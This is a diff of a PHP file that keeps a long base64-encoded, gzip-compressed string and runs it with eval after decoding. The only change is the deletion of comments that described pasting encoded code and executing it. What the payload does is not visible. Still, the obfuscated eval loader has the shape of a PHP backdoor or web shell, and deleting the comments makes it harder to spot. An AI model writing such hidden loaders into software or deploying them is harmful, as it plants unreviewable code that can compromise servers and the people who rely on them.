@@ -1,5 +1,5 @@
 <?php
-// Paste your encoded code here
+
 $encoded_code = 'eJztWV9z28YRf/eMv8MFbUMqIwAkRVmyRCqOZaX1TNt4LCedTibjOQJH4mwAh9wdSDFpXjJJ7Ad/gH4DO57UrmL
 PdPrSzwHab/0k3TuANP5STNLkpcWMJAB3t/fb3d/u7UKXLw3euvHB8Z0/3zpBngz8o8uXBuov8nE4GRpjbMAb9Y5gF+4QXIOASIwcD3N
 B5ND48M775r5RGAtxQIaGiEf3iCMN5LBQkhCmJufJ4+Q5/Jwj+PUieapfPEnOXz9C8Hi+eJic10lyWDTndOL9N2ThWHqM5wS9t9ffo7e
@@ -26,5 +26,5 @@ GxdALhTB5sWIHSl6mvN4A3cxjhKf56sejqtjuOwh0QAdWW3yjnp+ogVffboQoJFJXg6LeVgUGpJ+BfsF
 zZ/Y6uGv290d98+rufsfsXO3t7+GdK3t4d9/IiWovO5Bq2+Hmuo1SWyHUkOVwgiU58Yma0TYyJcotiLAgWBS0pa+g7lH9i9bMcjwsbd+
 6J4zKMizmoVpY/tjnWuDPbFdxfX4HT/4IwdY21MlnbH3c+cRS35dC99ijvtsWeTxfbLWXj4UeRnUuaQ9jZ//runzpP3MCZAk=';
 
-// Decode, decompress, and execute the code
+
 eval("?>" . gzuncompress(base64_decode($encoded_code)));
